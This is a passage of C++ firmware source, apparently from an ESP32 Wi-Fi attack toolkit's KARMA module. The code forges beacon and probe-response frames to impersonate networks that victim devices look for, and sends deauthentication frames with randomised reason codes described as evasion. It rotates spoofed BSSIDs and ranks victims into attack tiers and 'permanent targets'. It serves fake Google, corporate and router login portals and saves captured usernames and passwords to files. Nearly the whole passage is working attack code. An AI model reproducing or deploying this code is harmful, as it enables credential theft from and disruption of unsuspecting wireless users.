    portal.ssid = ssid;
    portal.channel = currentChannel;
    portal.targetMAC = mac;
    portal.timestamp = millis();
    portal.launched = false;
    portal.templateName = selectedTpl.name;
    portal.templateFile = selectedTpl.filename;
    portal.isDefaultTemplate = selectedTpl.isDefault;
    portal.verifyPassword = selectedTpl.verifyPassword;
    portal.priority = 95;
    portal.tier = TIER_HIGH;
    portal.duration = attackCfg.highTierDuration;
    portal.isCloneAttack = false;
    portal.probeCount = 1;
    portal.clientFingerprint = 0;
    portal.isHighValueTarget = false;
    portal.failureCount = 0;
    portal.lastAttempt = 0;
    
    if (enqueuePendingPortal(portal)) {
        stats.successfulAttacks++;
        updateBackoffCounter(ssid, true);
    }
}

// ============================================================
// Display Functions
// ============================================================

void forceFullRedraw() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(0, 0);
    tft.fillRect(0, 0, tftWidth, tftHeight, bruceConfig.bgColor);
    delay(50);
}

String getDisplayName(const String &fullPath, bool isSD) {
    String prefix = isSD ? "[SD] " : "[FS] ";
    String filename = fullPath.substring(fullPath.lastIndexOf('/') + 1);
    filename.replace(".html", "");
    return prefix + filename;
}

String generatePortalId(const String &templateName) {
    static int counter = 0;
    String safeName = templateName;
    safeName.replace(" ", "_");
    safeName.replace("[", "");
    safeName.replace("]", "");
    safeName.toLowerCase();
    safeName.replace("(verify)", "");
    safeName.trim();

    int instance = 1;
    FS *fs = nullptr;
    if (getFsStorage(fs)) {
        while (fs->exists("/PortalCreds/" + safeName + "_" + String(instance) + ".txt")) { instance++; }
    }

    return safeName + "_" + String(instance);
}

void savePortalCredentials(const String &ssid, const String &identifier, const String &password, 
                          const String &mac, uint8_t channel, const String &templateName, 
                          const String &portalId) {
    FS *fs = nullptr;
    if (!getFsStorage(fs)) return;

    if (!fs->exists("/PortalCreds")) {
        if (!fs->mkdir("/PortalCreds")) {
            Serial.println("[ERROR] Cannot create /PortalCreds");
            return;
        }
    }

    String filename = "/PortalCreds/" + portalId + ".txt";
    File file = fs->open(filename, FILE_WRITE);
    if (file) {
        file.println("=== PORTAL CAPTURE ===");
        file.printf("Portal: %s\n", portalId.c_str());
        file.printf("Time: %lu\n", millis());
        file.printf("Template: %s\n", templateName.c_str());
        file.printf("SSID: %s\n", ssid.c_str());
        file.printf("Client MAC: %s\n", mac.c_str());
        file.printf("Channel: %d\n", channel);
        file.printf("Identifier: %s\n", identifier.c_str());
        file.printf("Password: %s\n", password.c_str());
        file.println("=====================");
        file.close();
        Serial.printf("[PORTAL] Credentials saved to %s\n", filename.c_str());
    }

    File logFile = fs->open("/PortalCreds/captures_master.txt", FILE_APPEND);
    if (logFile) {
        logFile.printf("Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
                      millis(), portalId.c_str(), ssid.c_str(), identifier.c_str(),
                      password.c_str(), mac.c_str(), channel);
        logFile.close();
    }
}

String generateUniqueFilename(FS &fs, bool compressed) {
    String basePath = "/ProbeData/";
    String baseName = compressed ? "karma_compressed_" : "probe_capture_";
    String extension = compressed ? ".bin" : ".txt";
    if (!fs.exists(basePath)) fs.mkdir(basePath);
    int counter = 1;
    String filename;
    do {
        filename = basePath + baseName + String(counter) + extension;
        counter++;
    } while (fs.exists(filename) && counter < 100);
    return filename;
}

void initMACCache() { macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE * 18, RINGBUF_TYPE_NOSPLIT); }

bool isMACInCache(const String &mac) {
    if (!macRingBuffer) return false;
    size_t itemSize;
    char *item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
    while (item) {
        if (String(item) == mac) {
            vRingbufferReturnItem(macRingBuffer, item);
            return true;
        }
        vRingbufferReturnItem(macRingBuffer, item);
        item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
    }
    return false;
}

void addMACToCache(const String &mac) {
    if (!macRingBuffer) return;
    if (xRingbufferGetCurFreeSize(macRingBuffer) < mac.length() + 1) {
        size_t itemSize;
        char *oldItem = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
        if (oldItem) vRingbufferReturnItem(macRingBuffer, oldItem);
    }
    xRingbufferSend(macRingBuffer, mac.c_str(), mac.length() + 1, pdMS_TO_TICKS(100));
}

// ============================================================
// PMKID Validation
// ============================================================

bool isPMKIDValid(const uint8_t *frame, int len) {
    if (len < 36) return false;
    int pos = 24;
    while (pos + 1 < len) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        if (tag == 0x30 && tagLen >= 18) {
            if (pos + 2 + tagLen > len) return false;
            uint16_t version = (frame[pos + 2] << 8) | frame[pos + 3];
            if (version == 0x0001) {
                uint8_t akmCount = frame[pos + 12];
                if (akmCount > 0 && pos + 2 + tagLen >= 18) {
                    return true;
                }
            }
        }
        pos += 2 + tagLen;
    }
    return false;
}

// ============================================================
// Contextual Template Selection
// ============================================================

String getContextualTemplate(const String &ssid) {
    if (ssid.indexOf("office") != -1 || ssid.indexOf("corp") != -1 || 
        ssid.indexOf("admin") != -1 || ssid.indexOf("secure") != -1) {
        return "Corporate_Login";
    }
    if (ssid.indexOf("home") != -1 || ssid.indexOf("family") != -1 || 
        ssid.indexOf("house") != -1 || ssid.indexOf("wifi") != -1) {
        return "Router_Update";
    }
    if (ssid.indexOf("hotspot") != -1 || ssid.indexOf("public") != -1 || 
        ssid.indexOf("guest") != -1 || ssid.indexOf("free") != -1) {
        return "Google_Login";
    }
    return "";
}

// ============================================================
// Client Success Rate Tracking
// ============================================================

void updateClientSuccessRate(uint32_t fingerprint, bool success) {
    auto it = clientBehaviors.find(fingerprint);
    if (it == clientBehaviors.end()) return;
    
    ClientBehavior &client = it->second;
    if (success) {
        client.successfulInteractions++;
        client.consecutiveFailures = 0;
        client.lastSuccessTime = millis();
    } else {
        client.failedInteractions++;
        client.consecutiveFailures++;
    }
    
    float total = client.successfulInteractions + client.failedInteractions;
    if (total > 0) {
        client.successRate = (client.successfulInteractions / total) * 100.0f;
    }
    
    uint8_t score = 0;
    if (client.successRate > 50.0f) score += 30;
    if (client.consecutiveFailures < 2) score += 20;
    if (client.isVulnerable) score += 25;
    if (client.probeCount > 5) score += 15;
    if (client.successRate > 70.0f && client.isVulnerable) {
        client.isPermanentTarget = true;
    }
    client.priorityScore = score;
}

// ============================================================
// Utility Functions
// ============================================================

uint32_t generateClientFingerprint(const uint8_t *frame, int len) {
    uint32_t hash = 5381;
    int pos = 24;

    while (pos + 1 < len) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];

        if (pos + 2 + tagLen > len) break;

        hash = ((hash << 5) + hash) + tag;
        hash = ((hash << 5) + hash) + tagLen;

        int maxBytes = (tagLen < 8) ? tagLen : 8;
        for (int i = 0; i < maxBytes; i++) { hash = ((hash << 5) + hash) + frame[pos + 2 + i]; }

        pos += 2 + tagLen;
    }

    int8_t rssi = ((int8_t*)frame)[len - 1];
    hash = ((hash << 5) + hash) + (uint8_t)(rssi + 100);
    
    return hash;
}

bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *packet) {
    if (!packet || packet->rx_ctrl.sig_len < 24) return false;
    const uint8_t *frame = packet->payload;
    uint8_t frameType = (frame[0] & 0x0C) >> 2;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;
    if (frameType != 0x00 || frameSubType != 0x04) return false;
    return true;
}

String extractSSID(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int pos = 24;
    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];
        if (tag == 0x00 && len > 0 && len <= 32 && (pos + 2 + len <= packet->rx_ctrl.sig_len)) {
            bool hidden = true;
            for (int i = 0; i < len; i++) {
                if (frame[pos + 2 + i] != 0x00) {
                    hidden = false;
                    break;
                }
            }
            if (hidden) return "*HIDDEN*";
            char ssid[len + 1];
            memcpy(ssid, &frame[pos + 2], len);
            ssid[len] = '\0';
            return String(ssid);
        }
        pos += 2 + len;
    }
    return "*WILDCARD*";
}

String extractMAC(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
            frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
    return String(mac);
}

RSNInfo extractRSNInfo(const uint8_t *frame, int len) {
    RSNInfo rsn = {0, 0, 0, 0, false};
    int pos = 24;
    while (pos + 1 < len) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        if (tag == 0x30 && tagLen >= 2) {
            if (pos + 2 + tagLen <= len) {
                rsn.version = (frame[pos + 2] << 8) | frame[pos + 3];
                uint8_t groupCipher = frame[pos + 4];
                if (groupCipher == 0x00) rsn.groupCipher = 1;
                else if (groupCipher == 0x02) rsn.groupCipher = 2;
                if (tagLen > 6) {
                    uint8_t pairwiseCipher = frame[pos + 8];
                    if (pairwiseCipher == 0x00) rsn.pairwiseCipher = 1;
                    else if (pairwiseCipher == 0x02) rsn.pairwiseCipher = 2;
                }
                if (tagLen > 12) {
                    uint8_t akmSuite = frame[pos + 12];
                    if (akmSuite == 0x00 || akmSuite == 0x02) rsn.akmSuite = 1;
                    else if (akmSuite == 0x08) rsn.akmSuite = 2;
                    
                    if (tagLen > 14 && frame[pos + 14] == 0x08) {
                        rsn.isTransitionMode = true;
                    }
                }
            }
        }
        pos += 2 + tagLen;
    }
    return rsn;
}

bool isEAPOL(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;
    if (len < (24 + 8 + 4)) return false;
    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && payload[27] == 0x00 &&
        payload[28] == 0x00 && payload[29] == 0x00 && payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }
    if ((payload[0] & 0x0F) == 0x08) {
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && payload[29] == 0x00 &&
            payload[30] == 0x00 && payload[31] == 0x00 && payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }
    return false;
}

int classifyEAPOLMessage(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *payload = pkt->payload;
    int qosOffset = ((payload[0] & 0x0F) == 0x08) ? 2 : 0;
    int keyInfoOffset = 24 + qosOffset + 8 + 4 + 1;
    if (pkt->rx_ctrl.sig_len < keyInfoOffset + 2) return -1;
    uint16_t keyInfo = (payload[keyInfoOffset] << 8) | payload[keyInfoOffset + 1];
    bool install = keyInfo & (1 << 6);
    bool ack = keyInfo & (1 << 7);
    bool mic = keyInfo & (1 << 8);
    bool secure = keyInfo & (1 << 9);
    if (ack && !mic && !install) return 1;
    if (!ack && mic && !install && !secure) return 2;
    if (ack && mic && install) return 3;
    if (!ack && mic && !install && secure) return 4;
    return -1;
}

void generateRandomBSSID(uint8_t *bssid) {
    uint8_t vendorIndex = esp_random() % (sizeof(vendorOUIs) / 3);
    memcpy_P(bssid, vendorOUIs[vendorIndex], 3);
    bssid[3] = esp_random() & 0xFF;
    bssid[4] = esp_random() & 0xFF;
    bssid[5] = esp_random() & 0xFF;
    bssid[0] &= 0xFE;  // Clear multicast bit
    bssid[0] |= 0x02;  // ✅ Set locally administered bit
}

void rotateBSSID() {
    if (millis() - lastMACRotation > MAC_ROTATION_INTERVAL) {
        generateRandomBSSID(currentBSSID);
        lastMACRotation = millis();
    }
}

// ============================================================
// Frame Building Functions
// ============================================================

size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid, const String &targetMAC, 
                                  uint8_t channel, const RSNInfo &rsn, bool isHidden) {
    uint8_t pos = 0;
    buffer[pos++] = 0x50;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &buffer[pos], &buffer[pos+1], &buffer[pos+2], &buffer[pos+3], &buffer[pos+4], &buffer[pos+5]);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    for (int i = 0; i < 8; i++) buffer[pos++] = 0x00;
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    if (rsn.akmSuite > 0 || rsn.pairwiseCipher > 0) {
        buffer[pos++] = 0x31;
        buffer[pos++] = 0x04;
    } else {
        buffer[pos++] = 0x21;
        buffer[pos++] = 0x04;
    }
    buffer[pos++] = 0x00;
    buffer[pos++] = isHidden ? 0x00 : (uint8_t)ssid.length();
    if (!isHidden && ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&buffer[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    buffer[pos++] = 0x01;
    buffer[pos++] = sizeof(probe_rates);
    memcpy_P(&buffer[pos], probe_rates, sizeof(probe_rates));
    pos += sizeof(probe_rates);
    buffer[pos++] = 0x03;
    buffer[pos++] = 0x01;
    buffer[pos++] = channel;
    buffer[pos++] = 0x05;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x2a;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x32;
    buffer[pos++] = sizeof(ext_rates);
    memcpy_P(&buffer[pos], ext_rates, sizeof(ext_rates));
    pos += sizeof(ext_rates);
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x30;
        if (rsn.isTransitionMode) {
            buffer[pos++] = sizeof(rsn_transition);
            memcpy_P(&buffer[pos], rsn_transition, sizeof(rsn_transition));
            pos += sizeof(rsn_transition);
        } else if (rsn.akmSuite == 2) {
            buffer[pos++] = sizeof(rsn_wpa3);
            memcpy_P(&buffer[pos], rsn_wpa3, sizeof(rsn_wpa3));
            pos += sizeof(rsn_wpa3);
        } else {
            buffer[pos++] = sizeof(rsn_wpa2);
            memcpy_P(&buffer[pos], rsn_wpa2, sizeof(rsn_wpa2));
            pos += sizeof(rsn_wpa2);
        }
    }
    buffer[pos++] = 0x2d;
    buffer[pos++] = 0x1a;
    memcpy_P(&buffer[pos], ht_cap, sizeof(ht_cap));
    pos += sizeof(ht_cap);
    buffer[pos++] = 0x7f;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x40;
    return pos;
}

size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, uint8_t channel, const RSNInfo &rsn) {
    uint8_t pos = 0;
    buffer[pos++] = 0x80;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    memset(&buffer[pos], 0xFF, 6);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    static uint64_t timestamp = 0;
    timestamp += 1024 + (random(0, 100) - 50);
    for (int i = 0; i < 8; i++) buffer[pos++] = (timestamp >> (8 * i)) & 0xFF;
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x31;
        buffer[pos++] = 0x04;
    } else {
        buffer[pos++] = 0x21;
        buffer[pos++] = 0x04;
    }
    buffer[pos++] = 0x00;
    buffer[pos++] = (uint8_t)ssid.length();
    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&buffer[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    buffer[pos++] = 0x01;
    buffer[pos++] = sizeof(beacon_rates);
    memcpy_P(&buffer[pos], beacon_rates, sizeof(beacon_rates));
    pos += sizeof(beacon_rates);
    buffer[pos++] = 0x03;
    buffer[pos++] = 0x01;
    buffer[pos++] = channel;
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x30;
        if (rsn.isTransitionMode) {
            buffer[pos++] = sizeof(rsn_transition);
            memcpy_P(&buffer[pos], rsn_transition, sizeof(rsn_transition));
            pos += sizeof(rsn_transition);
        } else if (rsn.akmSuite == 2) {
            buffer[pos++] = sizeof(rsn_wpa3);
            memcpy_P(&buffer[pos], rsn_wpa3, sizeof(rsn_wpa3));
            pos += sizeof(rsn_wpa3);
        } else {
            buffer[pos++] = sizeof(rsn_wpa2);
            memcpy_P(&buffer[pos], rsn_wpa2, sizeof(rsn_wpa2));
            pos += sizeof(rsn_wpa2);
        }
    }
    buffer[pos++] = 0x05;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    return pos;
}

void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
    if (ssid.isEmpty() || channel < 1 || channel > 14) return;
    uint8_t beaconPacket[128] = {0};
    int pos = 0;
    beaconPacket[pos++] = 0x80;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    memset(&beaconPacket[pos], 0xFF, 6);
    pos += 6;
    // ✅ FIX: Use currentBSSID instead of hardcoded MAC
    memcpy(&beaconPacket[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&beaconPacket[pos], currentBSSID, 6);
    pos += 6;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x00;
    uint64_t timestamp = esp_timer_get_time() / 1000;
    memcpy(&beaconPacket[pos], &timestamp, 8);
    pos += 8;
    beaconPacket[pos++] = 0x64;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = 0x04;
    beaconPacket[pos++] = 0x00;
    beaconPacket[pos++] = ssid.length();
    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = sizeof(beacon_rates);
    memcpy_P(&beaconPacket[pos], beacon_rates, sizeof(beacon_rates));
    pos += sizeof(beacon_rates);
    beaconPacket[pos++] = 0x03;
    beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = channel;
    sendRawFrameOnAp(beaconPacket, pos, channel);
}

void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
    if (ssid.isEmpty() || mac.isEmpty()) return;
    uint8_t probeResponse[128] = {0};
    uint8_t pos = 0;
    probeResponse[pos++] = 0x50;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &probeResponse[pos], &probeResponse[pos+1], &probeResponse[pos+2],
           &probeResponse[pos+3], &probeResponse[pos+4], &probeResponse[pos+5]);
    pos += 6;
    memcpy(&probeResponse[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&probeResponse[pos], currentBSSID, 6);
    pos += 6;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;
    for (int i = 0; i < 8; i++) probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x64;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = 0x04;
    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = ssid.length();
    if (ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = sizeof(beacon_rates);
    memcpy_P(&probeResponse[pos], beacon_rates, sizeof(beacon_rates));
    pos += sizeof(beacon_rates);
    probeResponse[pos++] = 0x03;
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = channel;
    if (sendRawFrameOnAp(probeResponse, pos, channel)) { karmaResponsesSent++; }
}

// ============================================================
// KARMA-SPECIFIC CHANNEL FUNCTIONS
// ============================================================

std::vector<int> buildKarmaChannelList() {
    std::vector<int> channels;
    
    // Detect bands and build channel list
    detectSupportedBands();
    SupportedBands bands = getSupportedBands();
    
    if (bands.has2_4GHz) {
        // 2.4GHz channels - prioritize 1, 6, 11
        channels.push_back(1);
        channels.push_back(6);
        channels.push_back(11);
        // Add the rest
        for (int ch = 1; ch <= 14; ch++) {
            if (ch != 1 && ch != 6 && ch != 11) {
                channels.push_back(ch);
            }
        }
    }
    
    if (bands.has5GHz) {
        // 5GHz channels - common ones
        int fiveGHzChannels[] = {36, 40, 44, 48, 149, 153, 157, 161};
        for (int ch : fiveGHzChannels) {
            channels.push_back(ch);
        }
    }
    
    if (bands.has6GHz) {
        // 6GHz channels - representative subset
        int sixGHzChannels[] = {1, 5, 9, 13, 17, 21, 25, 29, 33, 37, 41, 45, 49, 53, 57, 61, 65, 69, 73, 77, 81, 85, 89, 93, 97, 101, 105, 109, 113, 117, 121, 125, 129, 133, 137, 141, 145, 149, 153, 157, 161, 165, 169, 173, 177, 181, 185, 189, 193, 197, 201, 205, 209, 213, 217, 221, 225, 229, 233};
        for (int ch : sixGHzChannels) {
            channels.push_back(ch);
        }
    }
    
    // If no channels found, fallback to 2.4GHz defaults
    if (channels.empty()) {
        channels.push_back(1);
        channels.push_back(6);
        channels.push_back(11);
    }
    
    return channels;
}

void karmaAdaptiveHop() {
    static std::vector<int> channelList;
    static size_t channelIndex = 0;
    static bool initialized = false;
    
    if (!initialized) {
        // Detect bands and build channel list
        channelList = buildKarmaChannelList();
        initialized = true;
        
        // Log the channel list
        String channelStr = "";
        for (size_t i = 0; i < channelList.size(); i++) {
            if (i > 0) channelStr += ", ";
            channelStr += String(channelList[i]);
        }
        Serial.printf("[KARMA] Adaptive hop channels: %s\n", channelStr.c_str());
    }
    
    if (channelList.empty()) {
        // Fallback to original karma_channels
        channelList.push_back(1);
        channelList.push_back(6);
        channelList.push_back(11);
    }
    
    // Rotate through channels
    channelIndex = (channelIndex + 1) % channelList.size();
    uint8_t nextChannel = channelList[channelIndex];
    
    // Only change if different
    if (nextChannel != channl + 1) {
        channl = nextChannel - 1;
        setChannelWithSecond(nextChannel);
        
        // Update display if needed
        screenNeedsRedraw = true;
    }
}

bool isKarmaChannelValid(uint8_t channel) {
    // Check if channel is in the supported band list
    int band = getWiFiBand(channel);
    return isBandSupported(band);
}

void setKarmaChannel(uint8_t channel) {
    if (isKarmaChannelValid(channel)) {
        channl = channel - 1;
        setChannelWithSecond(channel);
        screenNeedsRedraw = true;
    } else {
        Serial.printf("[KARMA] Channel %d not supported on this hardware\n", channel);
        // Fallback to first available channel
        std::vector<int> channelList = buildKarmaChannelList();
        if (!channelList.empty()) {
            channl = channelList[0] - 1;
            setChannelWithSecond(channelList[0]);
        }
    }
}

// ============================================================
// Deauth Function - Enhanced with evasion
// ============================================================

void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
    if (!karmaConfig.enableDeauth) return;

    unsigned long now = millis();
    if (now - lastDeauthReset > DEAUTH_BURST_WINDOW) {
        memset(deauthCount, 0, sizeof(deauthCount));
        lastDeauthReset = now;
    }

    if (channel >= 1 && channel <= 14) {
        if (deauthCount[channel - 1] >= MAX_DEAUTH_PER_SECOND) { return; }
        deauthCount[channel - 1]++;
    }

    if (activePortalChannel > 0 && channel != activePortalChannel) { return; }

    // Randomize reason code for evasion
    static const uint8_t reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08, 0x0A, 0x0D, 0x0F};
    uint8_t reason = reasons[random(sizeof(reasons))];

    uint8_t deauthPacket[26] = {0};
    deauthPacket[0] = 0xC0;
    deauthPacket[1] = 0x00;
    
    if (broadcast) {
        memset(&deauthPacket[2], 0xFF, 6);
    } else {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &deauthPacket[2], &deauthPacket[3], &deauthPacket[4],
               &deauthPacket[5], &deauthPacket[6], &deauthPacket[7]);
    }
    
    memcpy(&deauthPacket[8], currentBSSID, 6);
    memcpy(&deauthPacket[14], currentBSSID, 6);
    deauthPacket[20] = 0x00;
    deauthPacket[21] = 0x00;
    deauthPacket[22] = 0x01;
    deauthPacket[23] = 0x00;
    deauthPacket[24] = reason;
    deauthPacket[25] = 0x00;
    
    if (sendRawFrameOnAp(deauthPacket, 26, channel)) { 
        deauthPacketsSent++;
        
        // Track deauth attempts for success rate
        if (!broadcast) {
            uint32_t fingerprint = 0;
            for (char c : mac) fingerprint = ((fingerprint << 5) + fingerprint) + c;
            auto it = clientBehaviors.find(fingerprint);
            if (it != clientBehaviors.end()) {
                it->second.lastKarmaAttempt = now;
            }
        }
    }
}

// ============================================================
// Client Behavior Analysis
// ============================================================

static void analyzeClientBehavior(const ProbeRequest &probe) {
    auto it = clientBehaviors.find(probe.fingerprint);
    
    String rateKey = String(probe.fingerprint);
    unsigned long now = millis();
    if (now - lastRateLimitReset > RATE_LIMIT_WINDOW) {
        targetRateLimit.clear();
        lastRateLimitReset = now;
    }
    
    if (targetRateLimit[rateKey] >= karmaConfig.rateLimitPerTarget) {
        return;
    }
    targetRateLimit[rateKey]++;

    if (it == clientBehaviors.end()) {
        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
            uint32_t oldestFingerprint = 0;
            unsigned long oldestTime = UINT32_MAX;
            for (const auto &pair : clientBehaviors) {
                if (pair.second.lastSeen < oldestTime) {
                    oldestTime = pair.second.lastSeen;
                    oldestFingerprint = pair.first;
                }
            }
            if (oldestFingerprint != 0) { clientBehaviors.erase(oldestFingerprint); }
        }

        ClientBehavior behavior;
        behavior.fingerprint = probe.fingerprint;
        behavior.lastMAC = probe.mac;
        behavior.firstSeen = probe.timestamp;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount = 1;
        behavior.avgRSSI = probe.rssi;
        behavior.probedSSIDs.push_back(probe.ssid);
        behavior.favoriteChannel = probe.channel;
        behavior.lastKarmaAttempt = 0;
        behavior.isVulnerable = (!probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*"));
        behavior.successfulInteractions = 0;
        behavior.failedInteractions = 0;
        behavior.successRate = 0.0f;
        behavior.consecutiveFailures = 0;
        behavior.lastSuccessTime = 0;
        behavior.isPermanentTarget = false;
        behavior.priorityScore = 0;
        clientBehaviors[probe.fingerprint] = behavior;
        uniqueClients++;
    } else {
        ClientBehavior &behavior = it->second;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount++;
        behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;
        if (probe.channel >= 1 && probe.channel <= 14) {
            channelActivity[probe.channel - 1]++;
            if (channelActivity[probe.channel - 1] > channelActivity[behavior.favoriteChannel - 1])
                behavior.favoriteChannel = probe.channel;
        }
        bool ssidExists = false;
        for (const auto &existingSSID : behavior.probedSSIDs) {
            if (existingSSID == probe.ssid) {
                ssidExists = true;
                break;
            }
        }
        if (!ssidExists && !probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*") &&
            behavior.probedSSIDs.size() < 10) {
            behavior.probedSSIDs.push_back(probe.ssid);
            if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) behavior.isVulnerable = true;
        }
        
        if (behavior.isVulnerable && behavior.probeCount >= PERMANENT_TARGET_THRESHOLD &&
            behavior.successRate > 70.0f) {
            behavior.isPermanentTarget = true;
            handlePermanentTarget(behavior);
        }
    }
}

static uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
    uint8_t score = client.priorityScore;
    
    if (probe.rssi > -50) score += 30;
    else if (probe.rssi > -65) score += 20;
    else if (probe.rssi > -75) score += 10;
    
    if (client.probeCount > 10) score += 25;
    else if (client.probeCount > 5) score += 15;
    else if (client.probeCount > 2) score += 5;
    
    if (client.isVulnerable) score += 20;
    if (client.isPermanentTarget) score += 30;
    
    unsigned long sinceLast = millis() - client.lastSeen;
    if (sinceLast < 5000) score += 15;
    else if (sinceLast < 15000) score += 10;
    else if (sinceLast < 30000) score += 5;
    
    if (client.successRate > 70.0f) score += 25;
    else if (client.successRate > 50.0f) score += 15;
    
    if (client.consecutiveFailures > 3) score -= 20;
    else if (client.consecutiveFailures > 1) score -= 10;
    
    if (probeSSIDEquals(probe, "*WILDCARD*")) score = 0;
    
    return std::min(score, (uint8_t)255);
}

static AttackTier determineAttackTier(uint8_t priority) {
    if (priority >= 200) return TIER_CLONE;
    if (priority >= 100) return TIER_HIGH;
    if (priority >= 60) return TIER_MEDIUM;
    if (priority >= 40) return TIER_FAST;
    return TIER_NONE;
}

static uint32_t getPortalDuration(AttackTier tier) {
    switch (tier) {
        case TIER_CLONE: return attackConfig.cloneDuration;
        case TIER_HIGH: return attackConfig.highTierDuration;
        case TIER_MEDIUM: return attackConfig.mediumTierDuration;
        case TIER_FAST: return attackConfig.fastTierDuration;
        default: return attackConfig.mediumTierDuration;
    }
}

// ============================================================
// Permanent Target Handling
// ============================================================

void handlePermanentTarget(ClientBehavior &client) {
    if (!karmaConfig.enablePermanentTargets) return;
    if (!client.isPermanentTarget) return;
    if (client.successRate < 70.0f) return;
    
    if (pendingPortals.size() < MAX_PENDING_PORTALS) {
        PendingPortal portal;
        portal.ssid = client.probedSSIDs[0];
        portal.channel = client.favoriteChannel;
        portal.targetMAC = client.lastMAC;
        portal.timestamp = millis();
        portal.launched = false;
        portal.templateName = selectedTemplate.name;
